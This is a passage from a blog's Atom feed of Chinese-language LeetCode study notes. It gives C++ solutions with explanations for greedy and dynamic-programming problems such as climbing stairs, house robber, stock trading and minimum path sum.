class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;maximumUnits&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt;&amp;amp; boxTypes, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; truckSize)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;sort&lt;/span&gt;(boxTypes.&lt;span class=&quot;built_in&quot;&gt;begin&lt;/span&gt;(), boxTypes.&lt;span class=&quot;built_in&quot;&gt;end&lt;/span&gt;(), [](vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; x, vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; y)-&amp;gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; x[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] &amp;gt; y[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n = boxTypes.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; ret = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; n; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(truckSize) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ret += &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(truckSize, boxTypes[i][&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;])*boxTypes[i][&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                truckSize -= &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(truckSize, boxTypes[i][&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 50 + 27 + 14 = 91&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;简单题，排个序就行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;775-全局倒置与局部倒置&quot;&gt;&lt;a href=&quot;#775-全局倒置与局部倒置&quot; class=&quot;headerlink&quot; title=&quot;775. 全局倒置与局部倒置&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/global-and-local-inversions/&quot;&gt;775. 全局倒置与局部倒置&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;isIdealPermutation&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; nums.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;(); i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;abs&lt;/span&gt;(nums[i] - i) &amp;gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;最开始想复杂了，想用差分数组统计个数&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-dp</title>
    <link href="https://jingtianer.github.io/home/2022/11/08/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93dp/"/>
    <id>https://jingtianer.github.io/home/2022/11/08/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93dp/</id>
    <published>2022-11-08T03:14:34.000Z</published>
    <updated>2022-11-19T10:10:04.683Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>leetcode 101的动态规划专题</p></blockquote><h2 id="基本动态规划：一维"><a href="#基本动态规划：一维" class="headerlink" title="基本动态规划：一维"></a>基本动态规划：一维</h2><h3 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70. 爬楼梯"></a><a href="https://leetcode.cn/problems/climbing-stairs/">70. 爬楼梯</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;n ; i++) &#123;</span><br><span class="line">            <span class="type">int</span> c = a+b;</span><br><span class="line">            a=b;</span><br><span class="line">            b=c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>dp数组表示上n层楼有几种可能<br>转移方程是 $ dp[i] &#x3D; dp[i-1] + dp[i-2] $<br>上到第i层有可能从第i-1层或i-2层上来，则上到i层的可能数目就是 $ dp[i-1] + dp[i-2] $<br>由于dp[i]只需要前两个数的数据，所以可以优化掉dp数组，用两个变量代替，节省数组空间</p></blockquote><h3 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="198. 打家劫舍"></a><a href="https://leetcode.cn/problems/house-robber/">198. 打家劫舍</a></h3><h4 id="状态记录"><a href="#状态记录" class="headerlink" title="状态记录"></a>状态记录</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; mem;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = nums.<span class="built_in">size</span>();</span><br><span class="line">        mem = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">2</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">maxRob</span>(nums, <span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxRob</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; n &amp;&amp; mem[i+<span class="number">2</span>] != <span class="number">-1</span>) <span class="keyword">return</span> mem[i+<span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> a = (i+<span class="number">2</span> &lt; n ? <span class="built_in">maxRob</span>(nums, i+<span class="number">2</span>) + nums[i+<span class="number">2</span>] : <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> b = (i+<span class="number">3</span> &lt; n ? <span class="built_in">maxRob</span>(nums, i+<span class="number">3</span>) + nums[i+<span class="number">3</span>] : <span class="number">0</span>);</span><br><span class="line">        mem[i+<span class="number">2</span>] = (a &gt; b? a : b);</span><br><span class="line">        <span class="keyword">return</span> mem[i+<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>这是之前实习时写的代码思路不是dp，而是自上而下的带有状态记录的优先搜索<br>思路相同，就是，若打劫i，则一定不能打劫i+1，考虑是打劫i+2还是i+3<br>状态转移方程 $ dp[i] &#x3D; nums[i] + max(dp[i+2], dp[i+3]) $</p></blockquote><h4 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(len)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(len == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[len<span class="number">-1</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(nums[len<span class="number">-1</span>], nums[len<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        dp[len<span class="number">-1</span>] = nums[len<span class="number">-1</span>];</span><br><span class="line">        dp[len<span class="number">-2</span>] = <span class="built_in">max</span>(nums[len<span class="number">-1</span>], nums[len<span class="number">-2</span>]);</span><br><span class="line">        dp[len<span class="number">-3</span>] = <span class="built_in">max</span>(nums[len<span class="number">-2</span>], nums[len<span class="number">-3</span>] + dp[len<span class="number">-1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = len<span class="number">-4</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            dp[i] = nums[i] + <span class="built_in">max</span>(dp[i+<span class="number">3</span>], dp[i+<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp[<span class="number">0</span>], dp[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>由于第0家可以打劫，也可以跳过，所以最终结果是 $ max(dp[0], dp[1]) $</p></blockquote><blockquote><p>同上，也可以优化存储空间</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(len == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[len<span class="number">-1</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(nums[len<span class="number">-1</span>], nums[len<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> a = nums[len<span class="number">-1</span>],b = <span class="built_in">max</span>(nums[len<span class="number">-1</span>], nums[len<span class="number">-2</span>]), c = <span class="built_in">max</span>(nums[len<span class="number">-2</span>], nums[len<span class="number">-3</span>] + nums[len<span class="number">-1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = len<span class="number">-4</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> d = nums[i] + <span class="built_in">max</span>(a, b);</span><br><span class="line">            a = b;b = c;c = d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(b, c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="121. 买卖股票的最佳时机"></a><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock/">121. 买卖股票的最佳时机</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> minPos = len<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> maxx = prices[len<span class="number">-1</span>];</span><br><span class="line">        <span class="type">int</span> maxx1 = prices[len<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = len<span class="number">-2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            maxx1 = <span class="built_in">max</span>(prices[i], maxx1);</span><br><span class="line">            <span class="keyword">if</span>(maxx1 - prices[i] &gt; maxx - prices[minPos]) &#123;</span><br><span class="line">                minPos = i;</span><br><span class="line">                maxx = maxx1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx - prices[minPos];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>记maxx数组中 $ maxx[i] $ 表示 $ max(prices[j]); j &#x3D; i,i+1,…,n-1 $<br>假设在第i天买入，则应该在第i天后售价最高的一天卖出，也就是 $ maxx[i] $<br>再把maxx数组优化掉 </p></blockquote><h3 id="413-等差数列划分"><a href="#413-等差数列划分" class="headerlink" title="413. 等差数列划分"></a><a href="https://leetcode.cn/problems/arithmetic-slices/">413. 等差数列划分</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfArithmeticSlices</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(len &lt; <span class="number">3</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; len &amp;&amp; nums[i] - nums[i<span class="number">-1</span>] == nums[i<span class="number">-1</span>] - nums[i<span class="number">-2</span>]) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(count &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">                ans += (count<span class="number">-2</span>)*(count<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i &lt; len<span class="number">-1</span>) &#123;</span><br><span class="line">                i += <span class="number">1</span>;</span><br><span class="line">                count = <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>由于求的是连续子数组中为等差数列的个数，可以把nums看作多个公差不同的等差数列拼接在一起<br>只需要找到每段最长的等差数列，计算它有多少个子等差数列<br>也就是 $$ \sum_{i&#x3D;3}^n(n+1-i) &#x3D; (n-2) \times (n-1)&#x2F;2 $$ 其中n是等差数列的长度。<br>应该没有用dp的思想吧？</p></blockquote><h4 id="dp版"><a href="#dp版" class="headerlink" title="dp版"></a>dp版</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">numberOfArithmeticSlices</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">3</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] - nums[i<span class="number">-1</span>] == nums[i<span class="number">-1</span>] - nums[i<span class="number">-2</span>]) &#123;</span><br><span class="line">            dp[i] = dp[i<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">accumulate</span>(dp.<span class="built_in">begin</span>(), dp.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>举个例子可以看出<br>若nums &#x3D; [1,2,3,4,5,7,9,11]<br>则dp   &#x3D; [0,0,1,2,3,0,1,2]<br>一个等差数列中的 $ \sum(dp[i]) $ 和我上面分析的 $ \sum(n+1-i) $ 一样的</p></blockquote><h2 id="基本动态规划：二维"><a href="#基本动态规划：二维" class="headerlink" title="基本动态规划：二维"></a>基本动态规划：二维</h2><h3 id="64-最小路径和"><a href="#64-最小路径和" class="headerlink" title="64. 最小路径和"></a><a href="https://leetcode.cn/problems/minimum-path-sum/">64. 最小路径和</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            grid[i][<span class="number">0</span>] += grid[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            grid[<span class="number">0</span>][i] += grid[<span class="number">0</span>][i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                grid[i][j] += <span class="built_in">min</span>(grid[i<span class="number">-1</span>][j], grid[i][j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> grid[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>比较好想，因为只能向右或向下走，那么</p><ul><li>对于 $ grid[i][j] (i &gt; 0 , j &gt; 0) $ ， 到达它的最短路径是 $ grid[i][j] + min(grid[i-1][j], grid[i][j-1]) $</li><li>对于 $ grid[i][j] (i &#x3D; 0 , j &gt; 0) $ ， 到达它的最短路径是 $ grid[i][j] + grid[i][j-1] $</li><li>对于 $ grid[i][j] (i &gt; 0 , j &#x3D; 0) $ ， 到达它的最短路径是 $ grid[i][j] + grid[i-1][j] $</li></ul></blockquote><h4 id="dp数组压缩"><a href="#dp数组压缩" class="headerlink" title="dp数组压缩"></a>dp数组压缩</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; 